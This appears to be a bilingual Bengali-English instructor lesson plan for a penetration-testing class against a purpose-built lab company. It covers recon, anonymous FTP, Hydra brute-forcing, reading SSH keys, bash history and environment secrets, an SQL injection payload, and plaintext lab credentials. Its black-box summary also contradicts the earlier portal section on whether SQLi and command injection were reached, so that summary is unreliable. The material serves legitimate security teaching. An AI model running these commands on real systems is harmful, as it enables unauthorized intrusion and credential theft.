@@ -1,0 +1,1058 @@
+# 🏢 Enterprise Network Penetration Testing — Class Module 02
+### *"From Zero Knowledge to Full Compromise — Black-box to Gray-box"*
+
+> **Instructor:** [তোমার নাম]
+> **Duration:** 4–5 Hours
+> **Lab Environment:** Nexus Global Enterprise Lab — Live VPS-Hosted
+> **Level:** Beginner → Intermediate
+> **Target IP:** `<VPS_IP>` (Instructor এর machine, student দেখবে screen share এ)
+
+---
+
+## 🕐 Schedule Overview
+
+| Phase | Topic | Mode | Time |
+|:---|:---|:---:|:---:|
+| **Phase 1** | Enterprise Network Architecture | 📖 Lecture | 20 min |
+| **Phase 2** | Pentest Methodology: Black-box vs Gray-box | 📖 Lecture | 15 min |
+| **Phase 3** | Reconnaissance — nmap Full Scan | 💻 Live Demo | 15–20 min |
+| **Phase 4** | Service Analysis + Black-box Attack | 💻 Live Demo | 40–50 min |
+| ☕ | **Break** | — | 15 min |
+| **Phase 5** | Gray-box Switch — Full Pentest Chain | 💻 Live Demo | 60–75 min |
+| **Phase 6** | Classwork / CTF | 🔥 Hands-On | 30 min |
+| **Phase 7** | Wrap-up + Kill Chain + Report Concept | 📖 Debrief | 15 min |
+
+---
+
+# 🟢 PHASE 1 — Enterprise Network Architecture (20 min)
+## *"একটা বড় কোম্পানির নেটওয়ার্কে কী কী থাকে?"*
+
+---
+
+### 🎯 Opening Hook
+
+**Instructor বলবে:**
+> *"তোমরা যখন একটা বড় কোম্পানিকে hack করতে যাও — সেখানে শুধু একটা server থাকে না। পুরো একটা city-র মতো network থাকে। আজকে আমরা সেই city-র map বুঝবো, তারপর সেখানে ঢুকবো।"*
+
+---
+
+### 🗺️ Enterprise Network Zones — Live Diagram দেখাও
+
+**`enterprise-network.html` browser এ খুলো — students দেখবে**
+
+```
+INTERNET (আমরা attacker)
+     │
+     ▼
+┌─────────────────────────────────────────────┐
+│  WAN / ISP Layer  (198.51.100.0/24)         │
+│  Edge Router, DDoS Protection               │
+└─────────────────────┬───────────────────────┘
+                      │
+                      ▼
+┌─────────────────────────────────────────────┐
+│  DMZ — Demilitarized Zone  (10.0.1.0/24)   │  ← আমরা এখানে ঢুকবো
+│  WAF/Proxy · Web Portal · Mail · Bastion   │
+│  FTP · Telnet · SNMP · Exposed PostgreSQL  │
+└─────────────────────┬───────────────────────┘
+                      │ Firewall
+                      ▼
+┌─────────────────────────────────────────────┐
+│  Core Backbone  (10.0.2.0/24)               │
+│  Active Directory · SIEM · NAC · Grafana    │
+└─────────────────────┬───────────────────────┘
+                      │
+          ┌───────────┴───────────┐
+          ▼                       ▼
+┌─────────────────┐   ┌──────────────────────┐
+│  Data Center    │   │  Campus Network      │
+│  (10.0.3.0/24) │   │  (10.0.4.0/24)       │
+│  DB · ERP · SAN│   │  Workstations · VoIP │
+│  MinIO Backup  │   │  IoT · CCTV Cameras  │
+└─────────────────┘   └──────────────────────┘
+          │
+          ▼
+┌─────────────────────────────────────────────┐
+│  Cloud Tier  (172.16.0.0/24)                │
+│  Microservice API · Cloud DB · SSO Portal   │
+└─────────────────────────────────────────────┘
+```
+
+**প্রতিটা zone explain করো:**
+
+| Zone | কী থাকে | Real-world Example |
+|:---|:---|:---|
+| **WAN/DMZ** | Internet-facing services | Company website, mail, VPN |
+| **Core** | Internal infrastructure | AD, monitoring, NAC |
+| **Data Center** | Business-critical data | Database, ERP, Backup |
+| **Campus** | Employee devices | Laptops, phones, CCTV |
+| **Cloud** | Modern microservices | AWS/Azure hosted APIs |
+
+**Teaching Point:**
+> *"Firewall আছে মানে কিন্তু সব safe না। Firewall zone-to-zone traffic control করে — কিন্তু যদি একটা zone compromise হয়, সেখান থেকে pivot করা যায়। আজকে এটাই দেখবো।"*
+
+---
+
+### 🔐 Real Bangladesh Company Context
+
+**বলো:**
+> *"এই lab টা Bangladesh-এর একটা logistics কোম্পানির মতো সাজানো — Nexus Global Enterprise। এদের web portal, mail server, AD, cloud API, VoIP PBX, CCTV — সব আছে। আজকে আমরা এখানে একটা authorized pentest করছি।"*
+
+**Show করো (WOW moment — class শুরুর hook):**
+```bash
+docker ps --format "table {{.Names}}\t{{.Status}}"
+```
+> *"দেখো — ৩৩টা container মিলে একটা পুরো কোম্পানি চলছে।"*
+
+---
+
+# 🟡 PHASE 2 — Pentest Methodology (15 min)
+## *"Black-box vs Gray-box — কোনটা কেন?"*
+
+---
+
+### ⚫ Black-box Testing কী?
+
+**বলো:**
+> *"Black-box মানে — client তোমাকে শুধু একটা IP বা domain দিয়েছে। আর কিছু দেয়নি। তুমি জানো না ভেতরে কী আছে। একজন real attacker এর মতো শুরু করো।"*
+
+**সুবিধা:**
+- Most realistic — actual hacker এর perspective
+- Real-world attack surface বোঝা যায়
+
+**সমস্যা:**
+- অনেক সময় লাগে — days to weeks
+- অনেক attack surface miss হয়ে যায়
+- Client এর পয়সা বেশি যায়
+- অনেক vuln থাকে যেটা শুধু insider knowledge দিয়ে পাওয়া যায়
+
+---
+
+### ⬜ Gray-box Testing কী?
+
+**বলো:**
+> *"Gray-box মানে — client তোমাকে কিছু information দিয়েছে। Credentials, network map, IP ranges — কিছু বা সব। এটা simulate করে একজন insider threat বা stolen credential use করা attacker কে।"*
+
+**সুবিধা:**
+- অনেক বেশি thorough — সব attack surface cover করা যায়
+- কম সময়ে বেশি কাজ
+- Client এর বেশি value পায়
+- Hidden vulnerability যেগুলো black-box এ পাওয়া যেত না, সেগুলো পাওয়া যায়
+
+---
+
+### 💡 Client কোনটা চায়?
+
+**বলো:**
+> *"Real world-এ ৮০% pentest gray-box হয়। কারণ client চায় সব vulnerability জানতে — শুধু obvious গুলো না। Black-box শুধু দেখায় 'বাইরে থেকে কতটুকু দেখা যায়'। Gray-box দেখায় 'ভেতরে কী কী problem আছে'।"*
+
+**আজকের Plan:**
+> *"আমরা আজকে দুটোই করবো। প্রথমে black-box — একজন complete stranger হিসেবে। দেখবো কতদূর যাওয়া যায়। তারপর switch করবো gray-box এ। দেখবো কোন vuln গুলো শুধু gray-box এ পাওয়া সম্ভব।"*
+
+---
+
+### 📋 Rules of Engagement (ROE)
+
+**দেখাও — এটা class এ important:**
+```
+CLIENT:    Nexus Global Enterprise
+SCOPE:     Full-scope — VPS IP: <VPS_IP>
+DURATION:  Today's class session
+AUTHORIZED: Red Team Assessment
+FLAG FORMAT: FLAG{...}
+OUT OF SCOPE: কোনো DoS attack নেই, production data delete নেই
+```
+
+> *"Real pentest এ এই document sign করে তারপর শুরু করা হয়। এটাই তোমাকে legally protect করে।"*
+
+---
+
+# 🔵 PHASE 3 — Reconnaissance: Full Port Scan (15–20 min)
+## *"প্রথমে জানো — কে কোথায় আছে"*
+
+---
+
+### 📡 Scan চালাও
+
+**Instructor terminal খুলবে, scan দেবে:**
+
+```bash
+nmap -p- <VPS_IP> --open -T4
+```
+
+**Scan দিয়েই বলো:**
+> *"এই scan টা শেষ হতে ৩-৪ মিনিট লাগবে। nmap একে একে সব ৬৫৫৩৫টা port check করছে। এই সময়টা নষ্ট না — এই ফাঁকে আমরা আরেকটু গভীরে যাবো।"*
+
+---
+
+### ⏳ Scan চলার সময় — OSINT Concept
+
+**Scan চলতে থাকলে বলো:**
+
+> *"Real black-box pentest এ আমরা এই scan এর পাশাপাশি OSINT করতাম।"*
+
+**OSINT টুল গুলো দেখাও (conceptual — live করতে হবে না):**
+
+```
+Shodan.io      → Internet-এ exposed ports/banners
+WHOIS          → Domain owner কে?
+crt.sh         → SSL certificate history → subdomain list
+LinkedIn       → Employee names → potential usernames
+Google dorks   → site:nexusglobal.com filetype:pdf
+```
+
+**Teaching point:**
+> *"Shodan এ আজকেও অনেক Bangladesh company র exposed RDP, database, CCTV পাওয়া যায়। Pentester হিসেবে এটা দেখানোই তোমার কাজ — exploit করা না।"*
+
+**MITRE ATT&CK:**
+> `TA0043 — Reconnaissance`
+> `T1595 — Active Scanning`
+> `T1596 — Search Open Technical Databases (Shodan)`
+
+---
+
+### ✅ Scan Result — Real Output
+
+**Scan complete হলে output দেখাবে:**
+
+```
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh          ← VPS host SSH (out of scope)
+23/tcp   open  telnet
+53/tcp   open  domain
+80/tcp   open  http
+1025/tcp open  smtp         ← MailHog SMTP
+2222/tcp open  ssh          ← Lab Bastion (এটাই target)
+3000/tcp open  http         ← Grafana
+8025/tcp open  http         ← MailHog Web UI
+8080/tcp open  http         ← DDoS Proxy
+8444/tcp open  https        ← ZTNA Gateway
+8554/tcp open  rtsp         ← IP Camera (CCTV)
+8888/tcp open  http         ← HLS Stream
+9001/tcp open  http         ← MinIO Console (Primary)
+9003/tcp open  http         ← MinIO Console (DR Backup)
+```
+
+**বলো:**
+> *"দেখো — ১৫টা port open। Port 22 হলো VPS এর নিজের SSH — এটা আমাদের target না, out of scope। বাকি গুলো lab এর services। এখন version fingerprint করবো।"*
+
+```bash
+nmap -sV -sC -p 21,23,80,2222,8025,8080,8554,8888,9001,9003 <VPS_IP>
+```
+
+**Real version output:**
+
+```
+21/tcp   open  ftp      vsFTPd 3.0.5
+                        Anonymous FTP login allowed!
+                        Directory: /pub
+23/tcp   open  telnet   hostname: dmz-mon-01
+80/tcp   open  http     nginx/1.31.4
+                        robots.txt: /admin-console/ /api/v1/
+                                    /api/network/ /internal/
+2222/tcp open  ssh      OpenSSH 9.6
+8025/tcp open  http     MailHog Web UI
+8080/tcp open  http     nginx/1.31.4 (DDoS Proxy)
+8554/tcp open  rtsp     mediamtx (IP Camera)
+8888/tcp open  http     mediamtx (HLS stream)
+9001/tcp open  http     MinIO Console
+9003/tcp open  http     MinIO Console (DR)
+```
+
+**বলো:**
+> *"দুটো জিনিস এখনই interesting — এক: FTP তে anonymous login allowed! দুই: web server এর robots.txt এ sensitive path গুলো লেখা আছে — /admin-console/, /api/network/। Developer নিজেই বলে দিয়েছে কোথায় কী আছে।"*
+
+**MITRE ATT&CK:**
+> `T1595 — Active Scanning`
+> `T1592 — Gather Victim Host Information`
+
+---
+
+# 🟠 PHASE 4 — Service Analysis + Black-box Attack (40–50 min)
+## *"Black-box দিয়ে কতদূর যাওয়া যায়?"*
+
+---
+
+### 🎯 Service গুলো দেখাও
+
+```
+Port 21  — FTP        → Anonymous login possible?
+Port 23  — Telnet     → Plaintext protocol — credentials?
+Port 80  — HTTP       → Web application — কী আছে?
+Port 5432 — PostgreSQL → Database directly exposed!
+Port 8025 — MailHog   → Email intercept?
+```
+
+---
+
+### 🔴 Attack #1 — FTP Anonymous Login (Port 21)
+
+**Technology Explain করো (2 min):**
+> *"FTP মানে File Transfer Protocol। ১৯৭১ সালে বানানো protocol। Anonymous login মানে — username: anonymous, password: যেকোনো কিছু। অনেক পুরনো server এটা enable রেখে যায় ভুলে।"*
+
+**Live Demo:**
+```bash
+# Banner grab (nmap -sC তে এটা automatically দেখা গেছে)
+# আলাদা করে দেখতে চাইলে:
+nc -nv <VPS_IP> 21
+
+# Anonymous login:
+ftp <VPS_IP>
+Name: anonymous
+Password: test@test.com     ← যেকোনো কিছু দিলেই হয়
+```
+
+**Output:**
+```
+220 Nexus Global Enterprise FTP Server - Authorized Access Only
+230 Login successful.
+```
+
+```bash
+# Directory দেখো:
+ftp> ls
+# দেখবে: drwxr-xr-x pub/
+
+# pub folder এ ঢোকো:
+ftp> cd pub
+ftp> ls
+```
+
+**Real Output:**
+```
+-rw-r--r--  README.txt               (844 bytes)
+-rw-r--r--  infrastructure_report.txt (4558 bytes)
+-rw-r--r--  internal_network_map.txt  (7183 bytes)
+```
+
+**WOW Moment — এখানেই pause করো:**
+> *"দেখো — anonymous FTP তে তিনটা sensitive file publicly accessible। infrastructure_report.txt এবং internal_network_map.txt — এগুলোর নাম দেখেই বোঝা যাচ্ছে ভেতরে কী থাকতে পারে। Download করি।"*
+
+```bash
+# তিনটা file একে একে download করো:
+ftp> get README.txt
+ftp> get infrastructure_report.txt
+ftp> get internal_network_map.txt
+ftp> quit
+
+# তারপর read করো:
+cat README.txt
+cat infrastructure_report.txt
+cat internal_network_map.txt
+```
+
+---
+
+### 💣 FTP File Analysis — Black-box Goldmine
+
+**`cat infrastructure_report.txt` চালাও — output দেখাও:**
+
+```
+NEXUS GLOBAL ENTERPRISE
+Q3 2026 Infrastructure Security Assessment
+Classification: CONFIDENTIAL
+
+CRITICAL FINDINGS:
+[CRIT-01] Anonymous SMB on dc01 (10.0.2.10) — IT-Backups share এ
+          hardcoded DB credentials আছে (sync_prod_db.sh)
+[CRIT-02] MQTT Broker unauthenticated (10.0.4.70)
+[CRIT-03] NAC bypass vulnerability (10.0.2.15)
+
+HIGH FINDINGS:
+[HIGH-01] LDAP anonymous bind enabled (dc01 / 10.0.2.10)
+[HIGH-02] VoIP extension 1003 PIN: 1234
+[HIGH-03] RTSP camera no authentication (10.0.4.60)
+```
+
+**`cat internal_network_map.txt` চালাও — output দেখাও:**
+
+```
+DMZ (10.0.1.0/24):
+  10.0.1.20  srv-dmz-web01     Corporate Web Portal
+  10.0.1.40  bastion           SSH Jump Host (port 2222)
+  10.0.1.60  dmz-mon-01        THIS HOST (FTP server)
+
+Core (10.0.2.0/24):
+  10.0.2.10  dc01              Active Directory DC
+  10.0.2.21  nms-grafana-01    Grafana Dashboard
+  10.0.2.99  siem-soc-01       SIEM/SOC
+
+Data Center (10.0.3.0/24):
+  10.0.3.20  db-prod-01        PostgreSQL Production DB
+  10.0.3.30  san-backup-01     MinIO SAN Backup
+  NOTE: DB CREDS stored in IT-Backups SMB share on dc01
+
+Campus (10.0.4.0/24):
+  10.0.4.20  dev-workstation-01  DevOps PC (tahmed)
+  10.0.4.10  hr-workstation-01   HR PC (sjenkins)
+  10.0.4.70  iot-campus-01       IoT MQTT Broker
+```
+
+---
+
+### 🎯 Key Teaching Moment — "Black-box এই একটা FTP দিয়ে কী পেলাম"
+
+**Board এ লেখো:**
+
+```
+Anonymous FTP → 3টা file → আমরা এখন জানি:
+
+✅ পুরো internal network map (সব subnet, IP, hostname)
+✅ username list: tahmed (DevOps), sjenkins (HR), ibrahim (Branch)
+✅ DB credentials এর location: dc01 SMB → IT-Backups → sync_prod_db.sh
+✅ Production DB IP: 10.0.3.20
+✅ Grafana IP: 10.0.2.21
+✅ SIEM IP: 10.0.2.99
+✅ Open vulnerabilities list — company র নিজের audit report!
+✅ VoIP PIN: extension 1003 → 1234
+✅ MQTT broker unauthenticated (10.0.4.70)
+```
+
+**বলো:**
+> *"এটাকে বলে Sensitive Data Exposure। Company র নিজের CONFIDENTIAL security audit report publicly accessible FTP server এ রাখা আছে।*
+>
+> *কিন্তু একটু থামো — এটা একটা learning lab। এখানে intentionally এই files রাখা হয়েছে যাতে তোমরা শিখতে পারো। Real world এ কি সবসময় এরকম পাবে? না।*
+>
+> *Real company তে হয়তো FTP server ই থাকবে না। থাকলেও anonymous access নাও থাকতে পারে। আর থাকলেও এরকম sensitive document নাও পেতে পারো। অনেক সময় black-box এ কয়েকটা open port ছাড়া কিছুই পাওয়া যায় না — weeks ধরে।*
+>
+> *এই কারণেই gray-box important। Gray-box এ client তোমাকে guaranteed information দেয়। তোমাকে lucky হওয়ার জন্য অপেক্ষা করতে হয় না। কম সময়ে সব vulnerability cover করা যায়।*
+>
+> *আজকে আমরা lab এ lucky ছিলাম — FTP তে এতকিছু পেয়ে গেছি। এখন gray-box এ switch করবো এবং দেখবো credentials দিয়ে সরাসরি কীভাবে আরো deeper যাওয়া যায়।"*
+
+**MITRE ATT&CK:**
+> `T1083 — File and Directory Discovery`
+> `T1552.001 — Credentials in Files (via FTP leak)`
+> `T1087 — Account Discovery (username enumeration)`
+
+
+---
+
+### 🔴 Attack #2 — Telnet (Port 23)
+
+**Technology Explain করো (2 min):**
+> *"Telnet ১৯৬৯ সালের protocol। SSH এর আগে এটাই ছিল। সমস্যা — সব data plaintext যায়, password সহ। আজকেও অনেক legacy system এ চালু থাকে।"*
+
+**Live Demo:**
+```bash
+telnet <VPS_IP>
+```
+
+**Output:**
+```
+Connected to 202.182.123.38
+dmz-mon-01 login:
+```
+
+**বলো:**
+> *"Connect করার সাথে সাথেই hostname leak হয়ে গেছে — `dmz-mon-01`। এটাই একটা finding। এখন credential brute-force করতে Hydra use করবো।"*
+
+```bash
+hydra -l root -P ~/pentest_workspace/wordlists/nexus-passwords.txt \
+  telnet://<VPS_IP>
+```
+
+> *"এটা background এ চলতে থাকবে। আমরা এগিয়ে যাবো — result আসলে দেখবো।"*
+
+**✅ যদি Login হয় — এই commands চালাও:**
+```bash
+# কে আমি? কোন user?
+whoami
+id
+
+# Internal network দেখো:
+ip addr
+cat /etc/hosts          # internal hostname mapping
+
+# কী কী চলছে?
+ps aux
+netstat -an
+
+# Credential খোঁজো:
+cat /etc/passwd
+find / -name "*.conf" 2>/dev/null | head -20
+find / -name "*.txt" 2>/dev/null | grep -i "pass\|cred\|key" | head -10
+
+# SNMP config দেখো (এই host এ SNMP আছে):
+cat /etc/snmp/snmpd.conf
+```
+
+> *"এই host থেকে internal network এ কতটুকু যাওয়া যায় সেটাও দেখো — pivot point হিসেবে কাজ করতে পারে।"*
+
+**MITRE ATT&CK:**
+> `T1110.001 — Brute Force: Password Guessing`
+
+---
+
+### 🔴 Attack #3 — Web Portal (Port 80) — robots.txt Information Disclosure
+
+**Technology Explain করো (2 min):**
+> *"Port 80 এ nginx চলছে — corporate web portal। প্রথমে explore করি।"*
+
+**Step 1 — robots.txt থেকে Intel নাও:**
+```bash
+curl http://<VPS_IP>/robots.txt
+```
+
+**Real Output:**
+```
+User-agent: *
+Disallow: /admin-console/
+Disallow: /api/v1/
+Disallow: /api/network/
+Disallow: /internal/
+# NOTE: Internal ERP accessible at http://10.0.3.10:8000 from trusted subnets
+# IT diagnostic tools: /api/network/ping (internal use only)
+# App version: Nexus-Portal v2.4.1
+```
+
+**বলো:**
+> *"robots.txt এর comment এ developer ভুলে অনেক কিছু লিখে রেখেছে। Internal ERP এর IP — 10.0.3.10:8000। /api/network/ping endpoint — diagnostic tool। App version — Nexus-Portal v2.4.1।*
+>
+> *এগুলো এখনই কাজে লাগানো যাচ্ছে না — কারণ portal এ login লাগছে। আমরা default credentials try করবো।"*
+
+**Step 2 — Default credentials try করো:**
+```bash
+curl -X POST http://<VPS_IP>/login \
+  -d "username=admin&password=admin" -L -c cookies.txt
+```
+
+**বলো:**
+> *"admin/admin কাজ করলো না। এটাই black-box এর limitation — credential ছাড়া portal এর ভেতরে যাওয়া যাচ্ছে না। SQLi, CMDi — সব login এর পেছনে আছে।*
+>
+> *একজন hacker এখানে হয়তো দিনের পর দিন credential bruteforce করতো। আমরা pentester — এখানে আটকে থাকবো না। Gray-box এ client যখন credential দেবে, তখন এই সব attack করবো।*
+>
+> *এখন অন্য services দেখি।"*
+
+**Black-box Web Findings Summary:**
+```
+✅ robots.txt → sensitive paths + ERP IP + CMDi endpoint + version
+❌ Portal SQLi  → login required (Gray-box এ করবো)
+❌ CMDi         → login required (Gray-box এ করবো)
+```
+
+**MITRE ATT&CK:**
+> `T1592.003 — Gather Victim Host Information: Firmware (Version Disclosure)`
+> `T1083 — File and Directory Discovery (robots.txt)`
+
+
+---
+
+### 🎥 Attack #4 — IP Camera RTSP (Port 8554) — Unauthenticated Stream
+
+**কীভাবে জানলাম CCTV আছে?**
+> *"nmap -sV তে দেখেছিলাম: port 8554 — rtsp, server: mediamtx। RTSP মানে Real Time Streaming Protocol — এটা IP camera র protocol। port 8888 এ same mediamtx — HLS (browser-friendly) version।"*
+
+**Browser এ দেখো (Chrome এ RTSP কাজ করে না — HLS use করো):**
+```
+http://<VPS_IP>:8888/nexus-lobby/index.m3u8
+http://<VPS_IP>:8888/nexus-serverroom/index.m3u8
+http://<VPS_IP>:8888/nexus-parking/index.m3u8
+```
+
+**VLC দিয়ে:**
+```bash
+vlc rtsp://<VPS_IP>:8554/nexus-lobby
+vlc rtsp://<VPS_IP>:8554/nexus-serverroom
+```
+
+**বলো:**
+> *"কোনো authentication নেই। যে কেউ live camera feed দেখতে পারছে। Real company তে এরকম exposed CCTV অনেক common।"*
+
+**MITRE ATT&CK:**
+> `T1125 — Video Capture`
+
+---
+
+### 📧 Attack #5 — MailHog (Port 8025) — Unauthenticated Mail Server
+
+**Technology Explain করো:**
+> *"MailHog হলো test mail server — developer রা local এ email test করার জন্য use করে। Production এ রাখার কথা না। কিন্তু এখানে publicly exposed, no authentication।"*
+
+**Browser এ দেখাও:**
+```
+http://<VPS_IP>:8025
+→ No login required — directly inbox দেখা যাচ্ছে
+→ Internal emails intercept করা যাবে
+→ Password reset links, internal notifications — সব এখানে আসবে
+```
+
+**MITRE ATT&CK:**
+> `T1114 — Email Collection`
+
+---
+
+### 🗄️ Attack #6 — MinIO Object Storage (Port 9001) — Service Identification
+
+**Technology Explain করো:**
+> *"MinIO হলো S3-compatible object storage — AWS S3 এর মতো কিন্তু self-hosted। Backup, file storage এর জন্য use হয়।"*
+
+**Browser এ দেখাও:**
+```
+http://<VPS_IP>:9001
+→ MinIO login page — credentials দরকার
+→ Black-box এ identify করলাম, ভেতরে যেতে পারছি না
+→ Gray-box এ credentials দিয়ে দেখবো
+```
+
+**MITRE ATT&CK:**
+> `T1530 — Data from Cloud Storage`
+
+---
+
+### 🛑 Black-box এর Limit — Key Teaching Moment
+
+**এখানে pause করো। Board এ লেখো:**
+
+```
+✅ Black-box দিয়ে যা পেলাম:
+   → FTP anonymous files
+   → Web portal SQLi → employee credentials (FLAG 1)
+   → Command Injection → RCE (FLAG 2)
+   → SSH shell (DMZ foothold)
+
+❌ Black-box দিয়ে যা পাওয়া গেলো না:
+   → Internal network (10.0.2.x, 10.0.3.x, 10.0.4.x) invisible
+   → Active Directory credentials নেই
+   → Production database (10.0.3.20) unreachable
+   → Workstation এ রাখা SSH keys/credentials দেখা যাচ্ছে না
+   → MinIO backup এর password নেই
+   → SMB share এর contents access নেই
+```
+
+**বলো:**
+> *"একজন hacker এখান থেকে আরো অনেকক্ষণ কাজ করতো। Port forwarding, pivoting, brute-forcing — দিনের পর দিন। কিন্তু আমরা pentester। আমাদের কাজ হলো efficiently সব vulnerability বের করা — hacker এর মতো দিন কাটানো না.*
+>
+> *এখন client আমাদের extra information দেবে — আমরা gray-box শুরু করবো। দেখবো হাজারটা attack chain ছাড়াই কীভাবে directly সব critical vulnerability পাওয়া যায়।"*
+
+---
+
+# ☕ BREAK — 15 min
+
+**Break এ students দের জন্য:**
+> *"চাইলে নিজে try করো: `http://<VPS_IP>/?track_id=' OR 1=1--`"*
+
+---
+
+# 🔴 PHASE 5 — Gray-box Switch (60–75 min)
+## *"Client credentials দিলো — এখন full pentest"*
+
+---
+
+### 🔔 Explicit Switch Announcement
+
+**Instructor বলবে:**
+
+> *"এখন একটু দাঁড়াই। আমাদের pentest এর দ্বিতীয় phase শুরু হচ্ছে। Client — Nexus Global — আমাদের gray-box information দিয়েছে।*
+>
+> *এই information গুলো একজন hacker হয়তো অনেক attack chain করে পেতো — credential stuffing, phishing, insider threat, OSINT — সপ্তাহ বা মাস লাগতো। আমরা সেই সব skip করে directly test করবো।"*
+
+**Gray-box Package (board এ দেখাও):**
+```
+📋 Gray-box Information Received from Client:
+   → Network Map: 10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24
+   → Bastion Access: devops-remote@<VPS_IP>:2222 / devops-remote@123
+   → AD Domain: nexus.internal (10.0.2.10)
+   → Known user: tahmed / DevOpsP@ss2026!
+   → Monitoring: Grafana at 10.0.2.21:3000
+```
+
+---
+
+### 🔍 Gray-box Recon — Internal Network Discovery
+
+**বলো:**
+> *"Black-box এ আমরা outside থেকে scan করেছিলাম। এখন আমরা inside থেকে দেখবো — bastion shell আছে, সেখান থেকে internal network discover করবো। এই internal hosts গুলো বাইরে থেকে দেখাই যেত না।"*
+
+```bash
+# Bastion এ login করো
+ssh devops-remote@<VPS_IP> -p 2222
+
+# Internal subnets discover করো
+ip route
+# দেখবে: 10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24
+
+# Core network sweep:
+for i in $(seq 1 254); do
+  (ping -c1 -W1 10.0.2.$i &>/dev/null && echo "10.0.2.$i UP") &
+done; wait
+
+# Data Center sweep:
+for i in $(seq 1 254); do
+  (ping -c1 -W1 10.0.3.$i &>/dev/null && echo "10.0.3.$i UP") &
+done; wait
+```
+
+**Result আসলে:**
+```
+10.0.2.10  → AD Domain Controller
+10.0.2.15  → NAC Server
+10.0.2.20  → Prometheus
+10.0.2.21  → Grafana
+10.0.2.99  → SIEM/SOC
+10.0.3.10  → Internal ERP
+10.0.3.20  → Production PostgreSQL  ← TARGET
+10.0.3.30  → MinIO Backup Storage
+```
+
+**বলো:**
+> *"এই সব hosts black-box এ দেখাই যেত না। Firewall block করে রাখে। Gray-box এ আমরা directly এদের target করতে পারবো।"*
+
+---
+
+### 💎 Gray-box Exclusive #1 — Workstation Credential Harvest
+
+**বলো:**
+> *"এটা এমন একটা vulnerability যেটা black-box দিয়ে কোনোদিনই পাওয়া যেত না। Developer এর workstation এ কী কী stored credential আছে দেখি।"*
+
+```bash
+# DevOps workstation এ ঢোকো (gray-box info থেকে জানি এটা আছে)
+docker exec -it nexus-pc-dev-01 bash
+
+# SSH private key চেক করো
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa          # ← Private key! অন্য server এ ঢোকা যাবে
+
+# Bash history — কোন password কোথায় use করেছে?
+cat ~/.bash_history
+# দেখবে: psql -h 10.0.3.20 -U nexus_admin ... (DB password!)
+
+# Environment variables:
+env | grep -iE "pass|secret|key|token"
+
+# Saved credentials:
+cat ~/.pgpass 2>/dev/null       # PostgreSQL saved creds
+cat ~/.netrc 2>/dev/null        # Network credentials
+```
+
+**বলো:**
+> *"দেখো — developer এর workstation এ production database এর password সরাসরি bash history তে। Hacker হলে এটা পেতে প্রথমে phishing → malware → দিন বা সপ্তাহ পরে এই credential। আমরা gray-box এ directly এলাম।"*
+
+**MITRE ATT&CK:**
+> `T1552.003 — Unsecured Credentials: Bash History`
+> `T1552.004 — Unsecured Credentials: Private Keys`
+
+---
+
+### 💎 Gray-box Exclusive #2 — SMB Share Credential Leak
+
+**বলো:**
+> *"AD server এ একটা SMB share আছে — IT-Backups। Black-box এ share list দেখা যায় কিন্তু credential ছাড়া ভেতরে ঢোকা যায় না। Gray-box এ এখন authenticated access পাবো।"*
+
+```bash
+# Bastion থেকে:
+# Black-box এও এটুকু দেখা যেত — share list:
+smbclient -L //10.0.2.10 -N
+
+# Gray-box — Authenticated access:
+smbclient //10.0.2.10/IT-Backups -U "tahmed%DevOpsP@ss2026!"
+
+smb: \> ls
+smb: \> get sync_prod_db.sh       # DB backup script
+smb: \> get INFRA_RUNBOOK.txt     # Infrastructure runbook
+smb: \> exit
+
+# File দেখো:
+cat sync_prod_db.sh
+# দেখবে: PGPASSWORD="Nexu$$Prod2026!Sec" pg_dump -h 10.0.3.20 ...
+```
+
+**বলো:**
+> *"Jackpot। IT backup script এ production database এর password hardcoded। এটা সম্পূর্ণ gray-box exclusive — black-box এ share দেখা যেত কিন্তু ভেতরে credential ছাড়া ঢোকা যেত না।"*
+
+**MITRE ATT&CK:**
+> `T1039 — Data from Network Shared Drive`
+> `T1552.001 — Credentials in Files`
+
+---
+
+### 💎 Gray-box Exclusive #3 — Grafana: Monitoring System Takeover
+
+**বলো:**
+> *"প্রতিটা enterprise এ একটা monitoring system থাকে — network কেমন চলছে, কোন server এ কতটুকু load, সব দেখার জন্য। Nexus এ Grafana আছে। Black-box এ এই service টা দেখাই যাচ্ছিল না — কারণ এটা internal network এ। Gray-box এ আমরা জানি এটা 10.0.2.21 তে আছে।"*
+
+**Step 1 — Bastion থেকে Grafana reach করো:**
+```bash
+# Bastion এ আছি — internal Grafana accessible:
+curl -I http://10.0.2.21:3000
+# Response: 200 OK → Grafana চলছে
+
+# Anonymous access check:
+curl http://10.0.2.21:3000/api/org
+# Response: {"id":1,"name":"Main Org."} → Anonymous read access আছে!
+```
+
+**Step 2 — Default credentials try করো:**
+```bash
+# Default Grafana creds try:
+curl -X POST http://10.0.2.21:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"user":"admin","password":"admin"}'
+
+# Nexus custom creds try:
+curl -X POST http://10.0.2.21:3000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"user":"nexus_nms_admin","password":"NMS@Nexus2026!"}'
+# ✅ Login successful!
+```
+
+**Step 3 — Browser এ দেখাও (WOW moment):**
+```
+# SSH tunnel করো (local machine থেকে দেখার জন্য):
+ssh -L 3000:10.0.2.21:3000 devops-remote@<VPS_IP> -p 2222
+
+# তারপর browser এ:
+http://localhost:3000
+→ Login: nexus_nms_admin / NMS@Nexus2026!
+```
+
+**Browser এ দেখাও:**
+```
+Grafana Dashboard:
+  → All network nodes live metrics
+  → CPU/RAM/Network usage — সব server এর
+  → Internal IP mapping — কোন IP তে কী আছে
+  → Alert rules — কোন threshold set আছে
+  → Data sources → Prometheus config → internal endpoints
+```
+
+**বলো:**
+> *"দেখো — monitoring system এ ঢুকে গেছি। এখানে পুরো network এর map আছে। কোন server কোথায়, কীভাবে connected — সব। Black-box এ এই service টার existence ও জানতাম না। Gray-box এ directly এলাম।*
+>
+> *Real world এ এই ধরনের monitoring tool এ default credentials রেখে দেওয়া অনেক common। আর এই access দিয়ে attacker internal infrastructure এর পুরো picture পেয়ে যায়।"*
+
+**💡 Bonus — SNMP (Port 161):**
+```bash
+# Black-box scan এ port 161 UDP দেখা গিয়েছিল
+# Community string "public" try করো:
+snmpwalk -v2c -c public <VPS_IP>
+# Network device info, routing table, interface list dump হবে
+# এটাও একটা information leak — device vendor, OS version সব বের হয়
+```
+
+**MITRE ATT&CK:**
+> `T1078.001 — Valid Accounts: Default Accounts`
